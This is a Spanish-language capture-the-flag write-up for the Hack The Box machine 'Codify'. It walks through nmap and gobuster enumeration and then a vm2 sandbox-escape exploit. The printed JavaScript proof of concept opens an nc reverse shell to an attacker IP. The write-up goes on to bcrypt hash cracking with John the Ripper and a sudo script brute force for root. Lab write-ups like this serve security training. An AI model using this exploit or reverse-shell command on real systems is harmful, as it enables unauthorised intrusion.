---
description: https://app.hackthebox.com/machines/Codify
---

# 游릴 HTB - Codify

<figure><img src="../../.gitbook/assets/Codify.png" alt=""><figcaption></figcaption></figure>

## Informaci칩n General

* **Nombre de la M치quina:  Codify**
* **IP de la M치quina:**  10.10.11.239
* **Sistema Operativo: Linux**
* **Dificultad: Easy**
* **Fecha de Publicaci칩n:  04 Nov 2023**



***

### **Enumeration**

**Establecer el objetivo**

Primero, establecemos el objetivo utilizando el comando `settarget` con la direcci칩n IP de la m치quina objetivo:

```bash
settarget 10.10.11.239 Codify
```

<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

\
**Ping de reconocimiento**

Realizamos un ping a la m치quina objetivo para verificar la conectividad y obtener informaci칩n sobre la ruta utilizando la opci칩n `-R` para incluir la ruta de retorno:

```bash
ping -c 1 10.10.11.239 -R
```

<figure><img src="../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

**Escaneo de puertos con Nmap**

Luego, realizamos un escaneo de puertos utilizando Nmap para identificar los puertos abiertos en la m치quina objetivo. Utilizamos las opciones `-p-` para escanear todos los puertos, `--open` para mostrar solo los puertos abiertos, `-sS` para un escaneo de tipo TCP SYN, `--min-rate 5000` para establecer la velocidad m칤nima de paquetes y `-vvv` para un nivel de verbosidad alto. Adem치s, utilizamos `-n` para desactivar la resoluci칩n de DNS, `-Pn` para no realizar el escaneo de ping, y `-oG allPorts` para guardar la salida en un archivo con formato Greppable:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv  -n -Pn 10.10.11.239 -oG allPorts
```

<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

**Escaneo detallado con Nmap**

Posteriormente, realizamos un escaneo m치s detallado de los puertos identificados utilizando la opci칩n `-sCV` para detecci칩n de versiones y scripts de enumeraci칩n de servicios. Espec칤ficamente, indicamos los puertos a escanear con `-p __PORTS__` (reemplazando `__PORTS__` con los puertos identificados en el paso anterior) y guardamos la salida en un archivo de texto con el nombre `targeted`:

```bash
sudo nmap -sCV -p22,80,3000,8080 10.10.11.239 -oN targeted
```

<figure><img src="../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

```
cat targeted -l java
```

<figure><img src="../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

Para a침adir la entrada "10.10.11.239 codify.htb" al archivo `/etc/hosts`, puedes usar el siguiente comando en la terminal:

```bash
echo "10.10.11.239 codify.htb" | sudo tee -a /etc/hosts
```

Este comando a침ade la direcci칩n IP `10.10.11.239` asociada al nombre de host `codify.htb` al archivo `/etc/hosts` de tu sistema.

#### Utilizando WhatWeb para Obtener Informaci칩n sobre el Objetivo

Para obtener m치s informaci칩n sobre nuestro objetivo, utilizamos la herramienta WhatWeb. Esta herramienta nos permite identificar tecnolog칤as web utilizadas en el servidor, como el sistema de gesti칩n de contenidos (CMS), el lenguaje de programaci칩n, los plugins y otras caracter칤sticas. Ejecutamos el siguiente comando:

```bash
whatweb http://codify.htb > whatweb && cat whatweb -l java
```

<figure><img src="../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

Para realizar un descubrimiento de directorios en un sitio web utilizando Gobuster, puedes utilizar el siguiente comando:

```bash
gobuster dir -u http://codify.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```

<figure><img src="../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

Este comando utiliza Gobuster para realizar un escaneo de directorios en el sitio web `http://codify.htb/`. Utiliza el archivo de palabras `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` como lista de palabras clave para la b칰squeda. La opci칩n `-t 50` indica que se deben utilizar 50 threads simult치neos para acelerar el proceso.

**TIP: Instalaci칩n de SecLists con apt-get**

Para instalar SecLists en sistemas basados en Debian (como Ubuntu) utilizando `apt-get`, puedes seguir estos pasos:

1.  Actualiza la lista de paquetes disponibles:

    ```bash
    sudo apt-get update
    ```
2.  Instala SecLists:

    ```bash
    sudo apt-get install seclists
    ```

Con estos pasos, SecLists se instalar치 en tu sistema y podr치s acceder a la lista de palabras clave en el directorio `/usr/share/seclists/`

## `Exploitation`

Despu칠s de investigar exhaustivamente la p치gina web y enfrentarme a varios desaf칤os, descubr칤 un detalle revelador en la secci칩n "About-us": el nombre de la librer칤a utilizada en el sitio, VM2 3.9.16. Esta informaci칩n result칩 ser crucial, ya que al buscar en Google r치pidamente, encontr칠 referencias a un "Sandbox Escape" que podr칤a permitirnos realizar un bypass y ejecutar c칩digo malicioso en el sistema. Este descubrimiento destaca la importancia de la perseverancia y la atenci칩n a los detalles en la seguridad inform치tica, ya que a veces una peque침a pista puede conducir a grandes hallazgos.

<figure><img src="../../.gitbook/assets/image (76).png" alt=""><figcaption><p><a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244</a></p></figcaption></figure>

```javascript
const { VM } = require("vm2");
const vm = new VM();

const code = `
cmd = 'id'
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.80 6666 >/tmp/f');
}
`
console.log(vm.run(code));

```

<figure><img src="../../.gitbook/assets/image (77).png" alt=""><figcaption><p>El reverse shell lo saqu칠 de ac치: <a href="https://takingnotes.net/security/backdoors-and-shells/">https://takingnotes.net/security/backdoors-and-shells/</a></p></figcaption></figure>

Despues de un rato rebuscando el por el server me encuentro con un archivo llamado `tickets.db` alojado en `/var/www/contact/`

<figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

En este caso, utilizaremos John the Ripper con el formato bcrypt y una lista de palabras comunes para intentar crackear una contrase침a.

El comando utilizado es el siguiente:

```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

* `--format=bcrypt`: Especifica el formato del hash a crackear, en este caso, bcrypt.
* `--wordlist=/usr/share/wordlists/rockyou.txt`: Especifica la lista de palabras que se utilizar치n en el intento de crackeo. En este caso, se utiliza el archivo `rockyou.txt` que es una lista de contrase침as comunes.
* `hash.txt`: Especifica el archivo que contiene el hash de la contrase침a que queremos crackear.

<figure><img src="../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

Conseguimos crackear el hash ;). Por lo que probamos las credenciales, `ssh joshua@codify.htb`.

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

Encontramos permisos de root en mysql-backup.sh.\
El comando `sudo -l` se utiliza para listar los privilegios que un usuario tiene para ejecutar comandos con `sudo`. `sudo` es un programa que permite a los usuarios ejecutar comandos con los privilegios de otro usuario (normalmente el usuario `root` o administrador) de forma temporal y controlada.

<figure><img src="../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

Esto es un bruteforce para el mysql-backup.sh

<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption><p>/tmp/bash.sh</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption><p>Resultado</p></figcaption></figure>

Ahora probamos la nueva credencial

<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption><p>Ya estamos en root, pwned!</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>
